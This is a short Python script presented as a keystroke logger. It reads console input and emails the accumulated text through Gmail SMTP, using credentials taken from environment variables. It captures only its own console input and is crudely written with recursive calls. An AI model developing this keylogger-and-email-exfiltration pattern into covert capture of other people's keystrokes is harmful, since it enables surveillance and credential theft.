import smtplib
from email.mime.text import MIMEText
import os
from dotenv import load_dotenv

load_dotenv()

MY_EMAIL = os.getenv("MY_EMAIL")
PASSWORD = os.getenv("PASSWORD")

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

while True:
  def log_keys(key_str):
    key = input()
    key_str += key
    body = (f"The keystrokes have been recorded as: {key_str}")
    msg = MIMEText(body, "plain")
    msg["Subject"] = "Keystrokes Recorded"
    msg["From"] = MY_EMAIL
    msg["To"] = MY_EMAIL
    try:
      with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(MY_EMAIL, PASSWORD)
        server.sendmail(MY_EMAIL, MY_EMAIL, msg.as_string())
      print("Email sent successfully")
      key_str = ""
      log_keys(key_str)
    except Exception as e:
      print(f"An error occurred {e}")
  log_keys("")